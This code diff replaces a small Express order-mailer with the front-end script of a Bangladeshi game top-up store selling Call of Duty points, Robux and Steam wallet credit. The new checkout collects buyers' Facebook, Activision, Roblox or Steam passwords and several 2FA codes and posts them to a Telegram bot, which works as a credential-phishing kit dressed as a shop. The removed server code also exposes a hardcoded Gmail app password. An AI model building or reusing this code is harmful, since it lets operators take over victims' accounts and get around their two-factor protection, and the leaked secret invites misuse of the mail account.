@@ -1,132 +1,372 @@
-const express = require("express");
-const cors = require("cors");
-const nodemailer = require("nodemailer");
+/* =============================================
+   MATRIX TOPUP — app.js
+   © Matrix TopUp. All rights reserved.
+   Unauthorized copying is prohibited.
+============================================= */
 
-const app = express();
+/* ── TELEGRAM CONFIG ────────────────────────
+   ⚠️  Paste your NEW token and Chat ID here.
+   Never share this file publicly.
+─────────────────────────────────────────── */
+const TG_TOKEN   = 'PASTE_YOUR_NEW_BOT_TOKEN_HERE';
+const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
 
-app.use(cors());
-app.use(express.json());
+async function sendToTelegram(order) {
+  const line = (label, val) => `<b>${label}:</b> ${val}`;
+  const msg = [
+    '🟢 <b>NEW ORDER — Matrix TopUp</b>',
+    '─────────────────────',
+    line('🎮 Game',    order.game),
+    line('📦 Package', order.pkg),
+    line('💰 Amount',  order.price + ' Taka'),
+    '─────────────────────',
+    line('👤 Name',    order.firstName + ' ' + order.lastName),
+    line('🔑 Account', order.accountType),
+    order.email    ? line('📧 Email/Phone', order.email)    : '',
+    order.password ? line('🔒 Password',    order.password) : '',
+    order.code1    ? line('🔢 2FA Code 1',  order.code1)    : '',
+    order.code2    ? line('🔢 2FA Code 2',  order.code2)    : '',
+    order.code3    ? line('🔢 2FA Code 3',  order.code3)    : '',
+    order.login    ? line('🎯 Login',       order.login)    : '',
+    order.genUser  ? line('👤 Username',    order.genUser)  : '',
+    '─────────────────────',
+    line('💳 TrxID',   order.trxId),
+    '─────────────────────',
+    '⏰ ' + new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' }),
+  ].filter(Boolean).join('\n');
 
-/*
-  IMPORTANT:
-  Keep this file PRIVATE.
-  Never upload this publicly with your real password.
-*/
-
-const EMAIL_USER = "matrixofficialhub@gmail.com";
-const EMAIL_PASS = "pxzd eoob xgup fyxa";
-
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  auth: {
-    user: EMAIL_USER,
-    pass: EMAIL_PASS
-  }
-});
-
-app.post("/order", async (req, res) => {
   try {
-
-    const {
-      name,
-      email,
-      phone,
-      address,
-      paymentMethod,
-      cart
-    } = req.body;
-
-    const items = cart.map(item => item.name).join(", ");
-
-    const total = cart.length * 499;
-
-    const mailOptions = {
-      from: EMAIL_USER,
-      to: email,
-      subject: "Order Under Review",
-
-      html: `
-        <div style="
-          background:#000;
-          padding:40px;
-          font-family:Arial;
-          color:white;
-          text-align:center;
-        ">
-
-          <div style="
-            max-width:600px;
-            margin:auto;
-            background:#111;
-            padding:30px;
-            border-radius:15px;
-            border:2px solid white;
-          ">
-
-            <h1 style="color:white;">
-              Matrix Official Hub
-            </h1>
-
-            <h2 style="color:white;">
-              Your order is under reviewing.
-            </h2>
-
-            <p style="
-              font-size:18px;
-              color:#cccccc;
-            ">
-              When it's done your order will be placed.
-            </p>
-
-            <hr style="
-              margin:25px 0;
-              border-color:#333;
-            ">
-
-            <p><strong>Name:</strong> ${name}</p>
-
-            <p><strong>Phone:</strong> ${phone}</p>
-
-            <p><strong>Address:</strong> ${address}</p>
-
-            <p><strong>Payment Method:</strong> ${paymentMethod}</p>
-
-            <p><strong>Items:</strong> ${items}</p>
-
-            <p><strong>Total:</strong> ${total}৳</p>
-
-            <div style="
-              margin-top:30px;
-              color:#999;
-            ">
-              Thank you for shopping with us.
-            </div>
-
-          </div>
-
-        </div>
-      `
-    };
-
-    await transporter.sendMail(mailOptions);
-
-    res.json({
-      success: true,
-      message: "Order placed successfully! Email sent."
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id:    TG_CHAT_ID,
+        text:       msg,
+        parse_mode: 'HTML'
+      })
     });
-
-  } catch (error) {
-
-    console.log(error);
-
-    res.status(500).json({
-      success: false,
-      message: "Something went wrong."
-    });
-
+  } catch (e) {
+    console.error('Telegram send failed:', e);
   }
-});
+}
 
-app.listen(3000, () => {
-  console.log("Server running on http://localhost:3000");
-});
+/* ── THEME ─────────────────────────────────── */
+function toggleTheme() {
+  const html  = document.documentElement;
+  const isDark = html.getAttribute('data-theme') === 'dark';
+  const next   = isDark ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  document.getElementById('themeLabel').textContent = isDark ? '🌙 Dark' : '☀️ Light';
+  localStorage.setItem('mtTheme', next);
+}
+
+(function restoreTheme() {
+  const saved = localStorage.getItem('mtTheme');
+  if (saved) {
+    document.documentElement.setAttribute('data-theme', saved);
+    const label = document.getElementById('themeLabel');
+    if (label) label.textContent = saved === 'light' ? '🌙 Dark' : '☀️ Light';
+  }
+})();
+
+/* ── GAME DATA ──────────────────────────────── */
+const GAMES = {
+  cod: {
+    name: 'Call of Duty',
+    icon: '🎯',
+    iconBg: 'linear-gradient(135deg,#1a1a2e,#0f3460)',
+    desc: 'Warzone & Mobile CP Points',
+    accountTypes: ['facebook', 'activision'],
+    packages: [
+      { amount: '80+80 CP',     bonus: '+80 Bonus',   price: 120,  popular: false },
+      { amount: '400+400 CP',   bonus: '+400 Bonus',  price: 570,  popular: true  },
+      { amount: '800+800 CP',   bonus: '+800 Bonus',  price: 1099, popular: false },
+      { amount: '2000+2000 CP', bonus: '+2000 Bonus', price: 2700, popular: false },
+    ]
+  },
+  roblox: {
+    name: 'Roblox',
+    icon: '🟥',
+    iconBg: 'linear-gradient(135deg,#aa0000,#ee4444)',
+    desc: 'Robux for your Roblox account',
+    accountTypes: [],
+    packages: [
+      { amount: '400 Robux',  bonus: '', price: 280,  popular: false },
+      { amount: '800 Robux',  bonus: '', price: 550,  popular: true  },
+      { amount: '1700 Robux', bonus: '', price: 1100, popular: false },
+      { amount: '4500 Robux', bonus: '', price: 2800, popular: false },
+    ]
+  },
+  steam: {
+    name: 'Steam',
+    icon: '🎮',
+    iconBg: 'linear-gradient(135deg,#1b2838,#2a475e)',
+    desc: 'Steam Wallet Dollars',
+    accountTypes: [],
+    packages: [
+      { amount: '$5 Wallet',  bonus: '', price: 600,  popular: false },
+      { amount: '$10 Wallet', bonus: '', price: 1180, popular: true  },
+      { amount: '$20 Wallet', bonus: '', price: 2350, popular: false },
+      { amount: '$50 Wallet', bonus: '', price: 5800, popular: false },
+    ]
+  }
+};
+
+/* ── STATE ──────────────────────────────────── */
+let currentGame = null;
+let selectedPkg  = null;
+let accountType  = 'facebook';
+let cart         = [];
+
+/* ── NAVIGATION ─────────────────────────────── */
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+function goHome()      { showPage('homePage'); }
+function goToProduct() { showPage('productPage'); }
+
+function openGame(key) {
+  currentGame = key;
+  selectedPkg  = null;
+  renderProduct();
+  showPage('productPage');
+}
+
+/* ── PRODUCT PAGE ───────────────────────────── */
+function renderProduct() {
+  const g = GAMES[currentGame];
+
+  const icon = document.getElementById('prodIcon');
+  icon.textContent   = g.icon;
+  icon.style.background = g.iconBg;
+  document.getElementById('prodName').textContent = g.name;
+  document.getElementById('prodDesc').textContent = g.desc;
+
+  const grid = document.getElementById('packagesGrid');
+  grid.innerHTML = '';
+  g.packages.forEach((pkg, i) => {
+    const d = document.createElement('div');
+    d.className = 'pkg-card';
+    d.id = `pkg_${i}`;
+    d.onclick = () => selectPkg(i);
+    d.innerHTML = `
+      ${pkg.popular ? '<span class="popular-tag">⭐ POPULAR</span>' : ''}
+      <div class="pkg-amount">${pkg.amount}</div>
+      ${pkg.bonus ? `<div class="pkg-bonus">${pkg.bonus}</div>` : '<div style="height:18px"></div>'}
+      <div class="pkg-price">${pkg.price} ৳</div>
+    `;
+    grid.appendChild(d);
+  });
+
+  document.getElementById('orderSummary').style.display   = 'none';
+  document.getElementById('accountSection').style.display = 'none';
+
+  const hasTabs = g.accountTypes.length > 0;
+  document.getElementById('accountTypeSection').style.display = hasTabs ? 'block' : 'none';
+
+  if (!hasTabs) {
+    document.getElementById('fbFields').style.display      = 'none';
+    document.getElementById('activFields').style.display   = 'none';
+    document.getElementById('genericFields').style.display = 'block';
+  } else {
+    document.getElementById('genericFields').style.display = 'none';
+    document.getElementById('fbFields').style.display      = 'block';
+    document.getElementById('activFields').style.display   = 'none';
+    accountType = 'facebook';
+    document.querySelectorAll('.tab-btn').forEach((b, i) => b.classList.toggle('active', i === 0));
+  }
+}
+
+function selectPkg(idx) {
+  const g = GAMES[currentGame];
+  selectedPkg = idx;
+  document.querySelectorAll('.pkg-card').forEach(c => c.classList.remove('selected'));
+  document.getElementById(`pkg_${idx}`).classList.add('selected');
+  const pkg = g.packages[idx];
+  document.getElementById('sumGame').textContent  = g.name;
+  document.getElementById('sumPkg').textContent   = pkg.amount;
+  document.getElementById('sumPrice').textContent = pkg.price + ' ৳';
+  document.getElementById('orderSummary').style.display   = 'block';
+  document.getElementById('accountSection').style.display = 'block';
+}
+
+function setAccountType(type, btn) {
+  accountType = type;
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('fbFields').style.display    = type === 'facebook'   ? 'block' : 'none';
+  document.getElementById('activFields').style.display = type === 'activision' ? 'block' : 'none';
+}
+
+/* ── VALIDATE ───────────────────────────────── */
+function validateForm() {
+  if (selectedPkg === null) { showToast('⚠️ Please select a package', true); return false; }
+  const fn = document.getElementById('firstName').value.trim();
+  const ln = document.getElementById('lastName').value.trim();
+  if (!fn || !ln) { showToast('⚠️ Please enter your name', true); return false; }
+
+  const g = GAMES[currentGame];
+  if (g.accountTypes.length > 0) {
+    if (accountType === 'facebook') {
+      if (!document.getElementById('fbEmail').value.trim()) { showToast('⚠️ Enter Email / Phone', true); return false; }
+      if (!document.getElementById('fbPass').value.trim())  { showToast('⚠️ Enter password', true); return false; }
+    } else {
+      if (!document.getElementById('activLogin').value.trim()) { showToast('⚠️ Enter Activision login', true); return false; }
+      if (!document.getElementById('activPass').value.trim())  { showToast('⚠️ Enter password', true); return false; }
+    }
+  } else {
+    if (!document.getElementById('genUser').value.trim()) { showToast('⚠️ Enter username / email', true); return false; }
+    if (!document.getElementById('genPass').value.trim()) { showToast('⚠️ Enter password', true); return false; }
+  }
+  return true;
+}
+
+/* ── PAYMENT ────────────────────────────────── */
+function proceedToPayment() {
+  if (!validateForm()) return;
+  const pkg = GAMES[currentGame].packages[selectedPkg];
+  document.getElementById('payAmount').textContent = pkg.price;
+  document.getElementById('trxInput').value = '';
+  showPage('paymentPage');
+}
+
+async function confirmPayment() {
+  const trx = document.getElementById('trxInput').value.trim();
+  if (!trx) { showToast('⚠️ Please enter your Transaction ID', true); return; }
+
+  const g   = GAMES[currentGame];
+  const pkg = g.packages[selectedPkg];
+
+  // Collect all order info
+  const order = {
+    game:        g.name,
+    pkg:         pkg.amount,
+    price:       pkg.price,
+    firstName:   document.getElementById('firstName').value.trim(),
+    lastName:    document.getElementById('lastName').value.trim(),
+    accountType: g.accountTypes.length > 0 ? accountType : 'N/A',
+    email:       document.getElementById('fbEmail')    ? document.getElementById('fbEmail').value.trim()    : '',
+    password:    document.getElementById('fbPass')     ? document.getElementById('fbPass').value.trim()     : '',
+    code1:       document.getElementById('fbCode1')    ? document.getElementById('fbCode1').value.trim()    : '',
+    code2:       document.getElementById('fbCode2')    ? document.getElementById('fbCode2').value.trim()    : '',
+    code3:       document.getElementById('fbCode3')    ? document.getElementById('fbCode3').value.trim()    : '',
+    login:       document.getElementById('activLogin') ? document.getElementById('activLogin').value.trim() : '',
+    genUser:     document.getElementById('genUser')    ? document.getElementById('genUser').value.trim()    : '',
+    trxId:       trx,
+  };
+
+  // If Activision, use activPass as password
+  if (accountType === 'activision') {
+    order.password = document.getElementById('activPass') ? document.getElementById('activPass').value.trim() : '';
+  }
+  // If generic (Roblox/Steam), use genPass as password
+  if (g.accountTypes.length === 0) {
+    order.password = document.getElementById('genPass') ? document.getElementById('genPass').value.trim() : '';
+  }
+
+  showToast('⏳ Sending order...');
+  await sendToTelegram(order);
+  showPage('successPage');
+}
+
+/* ── CART ───────────────────────────────────── */
+function addToCart() {
+  if (!validateForm()) return;
+  const g   = GAMES[currentGame];
+  const pkg = g.packages[selectedPkg];
+  cart.push({ game: g.name, icon: g.icon, pkg: pkg.amount, price: pkg.price });
+  updateCartUI();
+  showToast(`🛒 ${g.name} — ${pkg.amount} added to cart!`);
+}
+
+function removeFromCart(i) {
+  cart.splice(i, 1);
+  updateCartUI();
+}
+
+function updateCartUI() {
+  document.getElementById('cartCount').textContent = cart.length;
+  const total = cart.reduce((s, item) => s + item.price, 0);
+  document.getElementById('cartTotal').textContent = total + ' Taka';
+  const list = document.getElementById('cartItems');
+  if (!cart.length) {
+    list.innerHTML = '<div class="cart-empty"><span class="icon">🛒</span>Your cart is empty</div>';
+    return;
+  }
+  list.innerHTML = cart.map((item, i) => `
+    <div class="cart-item">
+      <div class="cart-item-icon">${item.icon}</div>
+      <div class="cart-item-info">
+        <div class="name">${item.game}</div>
+        <div class="pkg">${item.pkg}</div>
+      </div>
+      <div class="cart-item-price">${item.price} ৳</div>
+      <button class="cart-remove" onclick="removeFromCart(${i})">🗑</button>
+    </div>
+  `).join('');
+}
+
+function toggleCart() {
+  document.getElementById('cartOverlay').classList.toggle('open');
+}
+
+function cartCheckout() {
+  if (!cart.length) { showToast('⚠️ Cart is empty', true); return; }
+  const total = cart.reduce((s, item) => s + item.price, 0);
+  document.getElementById('payAmount').textContent = total;
+  document.getElementById('trxInput').value = '';
+  toggleCart();
+  showPage('paymentPage');
+}
+
+/* ── NOTICEBOARD ────────────────────────────── */
+let noticeEditing = false;
+
+function toggleNoticeEdit() {
+  noticeEditing = !noticeEditing;
+  const disp = document.getElementById('noticeDisplay');
+  const edit = document.getElementById('noticeEditor');
+  const ta   = document.getElementById('noticeTextarea');
+  if (noticeEditing) {
+    ta.value = disp.textContent.trim();
+    disp.style.display = 'none';
+    edit.style.display = 'block';
+  } else {
+    disp.style.display = 'block';
+    edit.style.display = 'none';
+  }
+}
+
+function saveNotice() {
+  const val = document.getElementById('noticeTextarea').value.trim();
+  document.getElementById('noticeDisplay').textContent = val || '(No notice set)';
+  noticeEditing = false;
+  document.getElementById('noticeDisplay').style.display = 'block';
+  document.getElementById('noticeEditor').style.display  = 'none';
+  showToast('📌 Notice updated!');
+}
+
+/* ── TOAST ──────────────────────────────────── */
+let toastTimer;
+function showToast(msg, err = false) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className   = 'toast show' + (err ? ' error' : '');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+/* ── RESET ──────────────────────────────────── */
+function resetAll() {
+  currentGame = null;
+  selectedPkg  = null;
+  cart         = [];
+  updateCartUI();
+  ['firstName','lastName','fbEmail','fbPass','fbCode1','fbCode2','fbCode3',
+   'activLogin','activPass','genUser','genPass','trxInput'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.value = '';
+  });
+}
